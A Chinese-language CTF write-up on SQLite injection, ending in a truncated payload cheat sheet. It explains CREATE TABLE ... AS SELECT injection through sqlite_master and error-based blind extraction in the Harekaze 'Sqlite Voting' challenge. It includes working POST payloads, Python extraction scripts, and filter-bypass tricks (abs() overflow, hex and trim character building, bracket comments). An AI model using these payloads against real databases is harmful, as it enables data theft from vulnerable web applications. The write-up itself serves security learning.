<p>我们要做的就是通过自定义表利用可控变量达到注出 <code>FLAG_TABLE</code> 数据的目的。</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$table_name = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;table_name&#x27;</span>];</span><br><span class="line">$columns = $_POST[<span class="string">&#x27;columns&#x27;</span>];</span><br><span class="line"><span class="comment">//sqlite 创建表语句 sqlite3 database_name.db</span></span><br><span class="line">$filename = bin2hex(random_bytes(<span class="number">16</span>)) . <span class="string">&#x27;.db&#x27;</span>;</span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:db/&#x27;</span> . $filename);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_valid($table_name)) &#123;</span><br><span class="line">  flash(<span class="string">&#x27;Table name contains dangerous characters.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strlen($table_name) &lt; <span class="number">4</span> || <span class="number">32</span> &lt; strlen($table_name)) &#123;</span><br><span class="line">  flash(<span class="string">&#x27;Table name must be 4-32 characters.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count($columns) &lt;= <span class="number">0</span> || <span class="number">10</span> &lt; count($columns)) &#123;</span><br><span class="line">  flash(<span class="string">&#x27;Number of columns is up to 10.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;CREATE TABLE <span class="subst">&#123;$table_name&#125;</span> (&quot;</span>;</span><br><span class="line">$sql .= <span class="string">&quot;dummy1 TEXT, dummy2 TEXT&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($columns); $i++) &#123;</span><br><span class="line">  $column = (<span class="keyword">string</span>) ($columns[$i][<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  $type = (<span class="keyword">string</span>) ($columns[$i][<span class="string">&#x27;type&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_valid($column) || !is_valid($type)) &#123;</span><br><span class="line">    flash(<span class="string">&#x27;Column name or type contains dangerous characters.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (strlen($column) &lt; <span class="number">1</span> || <span class="number">32</span> &lt; strlen($column) || strlen($type) &lt; <span class="number">1</span> || <span class="number">32</span> &lt; strlen($type)) &#123;</span><br><span class="line">    flash(<span class="string">&#x27;Column name and type must be 1-32 characters.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $sql .= <span class="string">&#x27;, &#x27;</span>;</span><br><span class="line">  $sql .= <span class="string">&quot;`<span class="subst">$column</span>` <span class="subst">$type</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql .= <span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>表名和列名、列属性都是我们可控的，SQL 语句拼接如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#123;$table_name&#125; (dummy1 TEXT, dummy2 TEXT, &#96;$column&#96; $type);</span><br></pre></td></tr></table></figure>
<p>utils.php waf</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// comment out, calling function...</span></span><br><span class="line">    <span class="string">&quot;[\&quot;#&#x27;()*,\\/\\\\`-]&quot;</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//正则表达式：/[&quot;#&#x27;()*,\/\\`-]/i</span></span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $string)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>要想绕过，首先介绍 SQLite 的几个特性：</p>
<blockquote>
<p><a href="https://www.sqlite.org/lang_keywords.html">SQLite Keywords</a></p>
<p>SQLite 中使用关键字作为名称，有四种引用方法：</p>
<p><img src="https://i.loli.net/2020/11/11/mkFVCRUD2AMtjzI.png" style="zoom:80%;" /></p>
<p>括在方括号中的关键字是标识符。这不是标准的 SQL。MS access 和 SQL server 使用这种引用机制，SQLite 中包含这种引用机制是为了兼容。</p>
<p><img src="https://i.loli.net/2020/11/11/3yjqAYaFnIzOeNd.png" alt=""></p>
<p>既然正则中所有引号都有匹配，我们可以使用 <code>[]</code> 括关键字进行绕过，并可用它来<strong>注释</strong>，代替 <code>--</code> 。</p>
<p>MYSQL 中有 information_schema 这样的系统表方便注入查询，而 SQLite 有无？</p>
<p><a href="https://www.sqlite.org/schematab.html">sqlite_master</a></p>
<p>每个 SQLite 数据库都包含一个“模式表” ，用于存储该数据库的模式。数据库的模式是对数据库中包含的所有其他表、索引、触发器和视图的描述。模式表如下所示：</p>
<p><img src="https://i.loli.net/2020/11/11/UgNA3oCO2dWjY1b.png" style="zoom:80%;" /></p>
<p>其中 sql 字段的含义：</p>
<p>Sqlite _ schema.SQL 列存储描述对象的 SQL 文本。此 SQL 文本是 CREATE TABLE、 CREATE VIRTUAL TABLE、 CREATE INDEX、 CREATE VIEW 或 CREATE TRIGGER 语句，如果在数据库文件为数据库连接的主数据库时对其进行计算，则将重新创建该对象。<strong>文本通常是用于创建对象的原始语句的副本。</strong></p>
<p>换而言之，我们可以通过查询 sqlite_master 中的 sql 知晓 <code>FLAG_TABLE</code>  创建时的语句，获取到其表名和列名。</p>
<p>综上，我们所要利用的有两张表，这就需要能操作两张表的，与 create table 有关的用法。</p>
<p><a href="https://www.sqlite.org/lang_createtable.html">CREATE TABLE … AS SELECT Statements</a></p>
<p>“ CREATE TABLE… AS SELECT” 语句基于 SELECT 语句的结果创建并填充数据库表。该表的列数与 SELECT 语句返回的行数相同。每个列的名称与 SELECT 语句的结果集中相应列的名称相同。每个列的声明类型由 SELECT 语句结果集中相应表达式的表达式亲和类型确定。</p>
<p>使用 create table as 创建的表<strong>最初由 SELECT 语句返回的数据行填充</strong>。按照 SELECT 语句返回行的顺序，以连续升序的 rowid 值 (从1开始) 进行分配。</p>
</blockquote>
<p>由上，也就是说，我们能这样构造语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE landv as select sql [(dummy1 TEXT, dummy2 TEXT, &#96;whatever you want&#96; ] from sqlite_master;);</span><br><span class="line">--前面说过，[] 可用作注释（别名），也就是说，上面语句等价为</span><br><span class="line">CREATE TABLE landv as select sql from sqlite_master;</span><br><span class="line">--landv 这张由用户创建的表就会被 select 语句返回的数据行填充</span><br></pre></td></tr></table></figure>
<p>payload1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;路由 create 下 post</span><br><span class="line">table_name&#x3D;landv as select sql [&amp;columns[0][name]&#x3D;abc&amp;columns[0][type]&#x3D;] from sqlite_master;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/11/11/quSx32GhN9aVOzt.png" style="zoom:80%;" /></p>
<p>返回填充的第一行就是我们查出来的创建 <code>FLAG_TABLE</code> 的原始语句，同理，我们可以借此查出 flag 。</p>
<p>payload2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;路由 create 下 post</span><br><span class="line">table_name&#x3D;landv as select flag_2a2d04c3 [&amp;columns[0][name]&#x3D;abc&amp;columns[0][type]&#x3D;] from flag_bf1811da;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/11/11/E57ATl9OZU2BiFD.png" style="zoom:80%;" /></p>
<p>这道题主要是面向创表过程中可能的注入，但实际中运用得少（没有权限），接下来我们看整体。</p>
<h2 id="Sqlite-Voting"><a href="#Sqlite-Voting" class="headerlink" title="Sqlite Voting"></a>Sqlite Voting</h2><p>给了数据库文件和部分源码。</p>
<p>vote.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// waf</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// &quot; % &#x27; * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">&quot;[\&quot;%&#x27;*+\\/&lt;=&gt;\\\\_`~-]&quot;</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">&#x27;\s&#x27;</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">&#x27;blob&#x27;</span>, <span class="string">&#x27;load_extension&#x27;</span>, <span class="string">&#x27;char&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(in|sub)str&#x27;</span>, <span class="string">&#x27;[lr]trim&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;match&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;limit&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;join&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/json; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;id&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;You must specify vote id&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$id = $_POST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid($id)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Vote id contains dangerous chars&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// N.B</span></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:../db/vote.db&#x27;</span>);</span><br><span class="line">$res = $pdo-&gt;query(<span class="string">&quot;UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ($res === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;An error occurred while updating database&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Thank you for your vote! The result will be published after the CTF finished.&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
<p>schema.sql (actual flag is removed)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DROP TABLE IF EXISTS &#96;vote&#96;;</span><br><span class="line">CREATE TABLE &#96;vote&#96; (</span><br><span class="line">  &#96;id&#96; INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">  &#96;name&#96; TEXT NOT NULL,</span><br><span class="line">  &#96;count&#96; INTEGER</span><br><span class="line">);</span><br><span class="line">INSERT INTO &#96;vote&#96; (&#96;name&#96;, &#96;count&#96;) VALUES</span><br><span class="line">  (&#39;dog&#39;, 0),</span><br><span class="line">  (&#39;cat&#39;, 0),</span><br><span class="line">  (&#39;zebra&#39;, 0),</span><br><span class="line">  (&#39;koala&#39;, 0);</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS &#96;flag&#96;;</span><br><span class="line">CREATE TABLE &#96;flag&#96; (</span><br><span class="line">  &#96;flag&#96; TEXT NOT NULL</span><br><span class="line">);</span><br><span class="line">INSERT INTO &#96;flag&#96; VALUES (&#39;HarekazeCTF&#123;&lt;redacted&gt;&#125;&#39;);</span><br></pre></td></tr></table></figure>
<p>过滤非常严格。</p>
<p>这道题的 SQL 语句是 update <code>vote</code> 表中的 <code>count</code>  自增，并且还会有更新是否成功的回显：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($res === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;An error occurred while updating database&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从这基本可以确定是盲注了（从上面的 <code>banword</code> 也可以猜测），接下来我们需要的是故意使其报错，以便我们判断盲注是否正确。</p>
<h3 id="基于错误的-SQLite-盲注"><a href="#基于错误的-SQLite-盲注" class="headerlink" title="基于错误的  SQLite 盲注"></a>基于错误的  SQLite 盲注</h3><h4 id="可供制造错误的函数"><a href="#可供制造错误的函数" class="headerlink" title="可供制造错误的函数"></a>可供制造错误的函数</h4><p>通过参考 <a href="https://www.sqlite.org/lang_corefunc.html">SQLite 官方手册的内置函数</a></p>
<p>我们找到了以下几个函数故意制造错误：</p>
<blockquote>
<p><code>load_extension(x)</code>、<code>load_extension(x,y)</code></p>
<p><code>load_extension(x,y)</code> 函数使用入口点 y 从名为 x 的共享库文件中加载 SQLite 扩展。<code>load_extension ()</code> 的结果总是 NULL 。如果省略 y，则使用默认的入口点名称。如果扩展未能正确加载或初始化，则 <code>load _ extension()</code> 函数<strong>引发异常</strong>。</p>
<p>这个函数可以加载动态库，如 windows 的 dll ，linux 的 so ，换言之，我们可以利用其进行远程命令执行，这可以参考这篇 <a href="https://blog.csdn.net/qq_34101364/article/details/109250435">利用这个函数反弹 shell</a> 的博客。</p>
<p><code>abs(x)</code></p>
<p>返回数值参数 x 的绝对值，如果 x 为 NULL，则 abs(x) 返回 NULL。如果 x 是不能转换为数值的字符串或 blob，则 Abs (x) 返回0.0 。如果 x 是整数 -922337203685475808，那么 abs (x) <strong>抛出一个整数溢出错误</strong>。</p>
<p><img src="https://i.loli.net/2020/11/11/JGAwOYUvPhoHbfd.png" style="zoom:80%;" /></p>
<p>0x8000000000000000 为 -922337203685475808 的十六进制。</p>
<p><code>sum(x)</code></p>
<p>返回一组中所有非空值的数值总和。如果所有输入都是整数或者 NULL，在结果溢出时，<code>sum(x)</code> 将抛出一个<strong>“整数溢出”异常</strong> 。</p>
<p><code>ntile(n)</code></p>
<p>参数 n 被作为整数处理。这个函数将分区尽可能平均地划分为 n 组，并按 ORDER BY 子句定义的顺序或其他任意顺序将1到 n 之间的整数分配给每个组。如果有必要，会首先出现更大的组。此函数返回分配给当前行所属组的整数值。同上也是整数溢出。</p>
</blockquote>
<p>这里明显只能用整数溢出。</p>
<p>最朴素的盲注，是用 substr 和 ord 配合使用进行判断，但这里明显对其进行了限制，而且最重要的是，我们既不能用字符（引号被过滤），也不能用 ascii  码判断（ char 被过滤），那么我们到底要怎么才能判断每一位是否正确呢？</p>
<h4 id="利用长度变化的盲注"><a href="#利用长度变化的盲注" class="headerlink" title="利用长度变化的盲注"></a>利用长度变化的盲注</h4><blockquote>
<p>出题人 <a href="https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-350-sqlite-voting">st98 师傅</a> 是利用 <code>replace</code> 来判断是否正确：</p>
<p><a href="https://www.sqlite.org/lang_corefunc.html#replace">replace(x,y,z)</a></p>
<p>replace (x，y，z) 函数返回一个字符串，这个字符串是用字符串 z 替换字符串 x 中每个字符串 y 而形成的。BINARY 排序序列用于比较。如果 y 是一个空字符串，那么返回 x 不变。如果 z 最初不是字符串，则在处理之前将其强制转换为 UTF-8字符串。</p>
<p>简而言之，设 flag 为 <code>flag&#123;landv01&#125;</code> ，长度为 13 。</p>
<p><img src="https://i.loli.net/2020/11/11/QXFKjdHMwuDEmsC.png" style="zoom:80%;" /></p>
<p>长度变为了 9 ，是因 flag 中的 <code>flag</code> 四位被替换为空。</p>
<p>所以我们可以利用长度的变化来判断是否正确。</p>
<hr>
<p>下面是我对利用长度变化进行盲注的一些扩展：</p>
<p>实际上，我还找到了 <code>trim(x,y)</code> 企图达到与 <code>replace</code> 一样的效果：</p>
<p><img src="https://i.loli.net/2020/11/12/NgcCQxJ6EpmnePT.png" style="zoom:80%;" /></p>
<p>但当测试包含 <code>&#123;</code> 时，<code>trim(x,y)</code> 的回显为什么却是 6 ？</p>
<p><img src="https://i.loli.net/2020/11/12/xlyhmtvaBHYVsr6.png" style="zoom:80%;" /></p>
<p>结合<a href="https://www.sqlite.org/lang_corefunc.html#trim">官方文档</a>的解释，<code>trim(x,y)</code> 函数返回一个字符串，该字符串由删除 X <strong>两端</strong>出现在 Y 中的<strong>任何和所有字符组成</strong>。</p>
<p>如果省略了 Y 参数，<code>trim(x)</code> 将删除 X 两端的空格（这是最常用的用法）</p>
<p>也就是说，如果 y 是 <code>flag&#123;</code>  ，那么 <code>fla</code> 、<code>la</code> 这样的组合都会被删掉，所以并不能用于判断是否正确，虽说你可以一直寻找直至长度变化（ <code>ltrim()</code> 这里是删除 x 左端）：</p>
<p><img src="https://i.loli.net/2020/11/12/uh4NmtZgJCbjxPd.png" style="zoom:80%;" /></p>
<p>虽说在 SQLite <code>trim()</code> 不能很有效地判断，但在 <a href="https://docs.oracle.com/en/database/oracle/oracle-database/20/sqlrf/TRIM.html#GUID-00D5C77C-19B1-4894-828F-066746235B03">Oracle</a> 中是可行的：</p>
<p>“如果您指定了 LEADING，那么 Oracle 数据库将删除所有等于 trim _ character 的前导字符。”</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">length(trim(leading &#x27;f&#x27; from flag))</span><br></pre></td></tr></table></figure>
<p>上述语句可在 Oracle 中用于判断。</p>
</blockquote>
<p>现在我们报错和判断正确的手段都有了，就要考虑特殊字符的绕过。</p>
<p>一堆限制，就用 hex 编码来进行绕过，因为一些比较的运算符都被 ban 了，我们利用位运算符代替：</p>
<p>以下脚本来自出题人师傅博客。</p>
<p>首先考虑 flag 长度的判断。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abs(case(length(hex((select(flag)from(flag))))&amp;&#123;1&lt;&lt;n&#125;)when(0)then(0)else(0x8000000000000000)end)</span><br></pre></td></tr></table></figure>
<p>最外围我们用 <code>abs()</code> 抛出整数溢出的错误。</p>
<p>其中用 case 计算表达式，flag 长度与 <code>&#123;1&lt;&lt;n&#125;</code> 按位相与：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">length(hex((select(flag)from(flag))))  &amp;  &#123;1&lt;&lt;n&#125;</span><br></pre></td></tr></table></figure>
<p><code>&#123;1&lt;&lt;n&#125;</code> 也就是 2 的 n 次方，相与的作用只是为了把和 flag 长度（二进制）为 1 的部分记录下来，可想而知，一直从 1 循环到 n 为 16 ，我们把所有 1 都记录下来后，flag 的长度也就自然得出了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># フラグの長さを特定</span></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  r = requests.post(URL, data=&#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line">print(<span class="string">&#x27;[+] length:&#x27;</span>, l)</span><br></pre></td></tr></table></figure>
<p>然后就是比对 hex 编码，0123456789 都能正常运用，但像 abcdef 就又要用到引号。</p>
<h3 id="解法一-利用-trim-hex-删除构造字符"><a href="#解法一-利用-trim-hex-删除构造字符" class="headerlink" title="解法一 利用 trim + hex 删除构造字符"></a>解法一 利用 trim + hex 删除构造字符</h3><p>而上面我们不是提到 <code>trim()</code> 这个无差别，所有组合都会删除的函数吗，只要我们能构造出只有一个字母例如 A 的 hex 值，把全部数字删除，那不就得到 A 了吗？</p>
<p>如下，我们利用表中的数据和特殊函数的返回值来构造相应字符。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span> </span><br><span class="line"><span class="comment"># &#x27;zebra&#x27; → &#x27;7A65627261&#x27;</span></span><br><span class="line"><span class="comment"># trim 删除 1,2,5,6,7 后只剩下了 A ，以下同理</span></span><br><span class="line">table[<span class="string">&#x27;C&#x27;</span>] = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span> </span><br><span class="line"><span class="comment"># &#x27;real&#x27; → &#x27;7265616C&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;D&#x27;</span>] = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span> </span><br><span class="line"><span class="comment"># 0xffffffffffffffff = -1 → &#x27;2D31&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;E&#x27;</span>] = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span> </span><br><span class="line"><span class="comment"># 0.1 → 302E31</span></span><br><span class="line">table[<span class="string">&#x27;F&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span> </span><br><span class="line"><span class="comment"># &#x27;dog&#x27; → &#x27;646F67&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;B&#x27;</span>] = <span class="string">f&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">&quot;C&quot;</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">&quot;F&quot;</span>]&#125;</span>)&#x27;</span> </span><br><span class="line"><span class="comment"># &#x27;koala&#x27; → &#x27;6B6F616C61&#x27;</span></span><br><span class="line"><span class="comment"># || 是连接符，第二项的意思是 16||C||F ，也就是利用 trim 删除 1,6,C,F </span></span><br></pre></td></tr></table></figure>
<p>接下来就是判断每一位字符了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># フラグをゲット!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里是已知 flag 格式为 HarekazeCTF&#123; ，我们对其 hex 编码，接下来只需要盲注后面的字符</span></span><br><span class="line">res = binascii.hexlify(<span class="string">b&#x27;HarekazeCTF&#123;&#x27;</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res), l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;0123456789ABCDEF&#x27;</span>:</span><br><span class="line">    t = <span class="string">&#x27;||&#x27;</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&#x27;0123456789&#x27;</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  print(<span class="string">f&#x27;[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line">print(<span class="string">&#x27;[+] flag:&#x27;</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>
<p><code>trim(0,0)</code> 实际上就是空，<code>l</code> 是 flag 的长度，<code>t</code> 是我们每次进行测试的字符串（如果有字符被确定了，就会被连接 <code>||</code> 进 <code>t</code> ）。</p>
<p>实际上，发送的请求是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abs(case(</span><br><span class="line">replace(</span><br><span class="line">length(replace(hex((select(flag)from(flag))),test_data,&#39;&#39;))    # 这里进行替换和获取长度</span><br><span class="line">,flag_length,&#39;&#39;)                                               # 第二个 replace 判断长度是否变化</span><br><span class="line">)when(&#39;&#39;)then(0)else(0x8000000000000000)end)</span><br></pre></td></tr></table></figure>
<p>如果长度变化了就会报错，那么就是测试的字符是有的，被添加进 <code>res</code> ，再十六进制转字符就 getflag 了。</p>
<h3 id="解法二-双重-hex-编码删除字母"><a href="#解法二-双重-hex-编码删除字母" class="headerlink" title="解法二 双重 hex 编码删除字母"></a>解法二 双重 hex 编码删除字母</h3><p>解法一是费了很大劲去构造出 abcdef 的，但我们可以直接双重编码，仅用数字来进行判断。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abs(ifnull(nullif(length((SELECT(flag)from(flag))),$LENGTH$),0x8000000000000000))</span><br></pre></td></tr></table></figure>
<p><code>ifnull</code> 返回两个参数中不为 0 的数，<code>nullif</code> 两个参数相同返回 NULL ，不同返回第一个参数。</p>
<p>换言之，以上 payload 在做的就是遍历 $LENGTH$ 找到与 flag 长度相等的数。</p>
<p>得到了长度，我们同样面临构造特数字符的问题，这里用了双重 hex 编码，编码后 flag 的长度即上面的 4 倍。</p>
<p>4 倍长度的 hex 纯数字编码会被用科学计数法表示，但我们可以用上面用到的 <code>||</code> 来进行连接，由这我们可以得到 payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abs(ifnull(nullif(max(hex(hex((SELECT(flag)from(flag)))),$NUMBER$),$NUMBER$),0x8000000000000000))</span><br></pre></td></tr></table></figure>
<p>所以便可遍历 4 倍长度的 $NUMBER$ ，利用 <code>max</code> 得到双重编码后的 flag ，双重解码后即可。</p>
<h1 id="Cheat-Sheet"><a href="#Cheat-Sheet" class="headerlink" title="Cheat Sheet"></a>Cheat Sheet</h1><p>下面结合题解直接来总结一套 Cheat Sheet，其中整合了一些外网搜集过来的 payload ，还有自己弄出来的一些：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>name</th>
<th>syntax</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>注释 1</td>
<td>—</td>
<td></td>
</tr>
<tr>
<td>注释 2</td>
<td>/**/</td>
<td></td>
</tr>
<tr>
<td>注释 3</td>
<td>[]</td>
<td></td>
</tr>
<tr>
<td>IF 语句</td>
<td>CASE WHEN</td>
<td></td>
</tr>
<tr>
<td>连接符</td>
<td>`</td>
<td></td>
<td>`</td>
<td></td>
</tr>
<tr>
<td>截取子串</td>
<td>substr(x,y,z)</td>
<td></td>
</tr>
<tr>
<td>获取长度</td>
<td>length(stuff)</td>
<td></td>
</tr>
<tr>
<td>获取版本信息</td>
<td>select sqlite_version();</td>
<td></td>
</tr>
<tr>
<td>获取表名</td>
<td>SELECT tbl_name FROM sqlite_master;</td>
<td></td>
</tr>
<tr>
<td>获取列名</td>
<td>SELECT sql FROM sqlite_master;</td>
<td></td>
</tr>
<tr>
<td>基于错误的盲注 1</td>
<td>abs(case(xxx)when(xxx)then(0)else(0x8000000000000000)end)</td>
<td>判断字符，abs 可由 sum 、ntile 等函数替换，case 计算的表达式可用如 replace(length(replace(x,y,z)),y,z) 这样利用长度变化判断</td>
</tr>
<tr>
<td>基于错误的盲注 2</td>
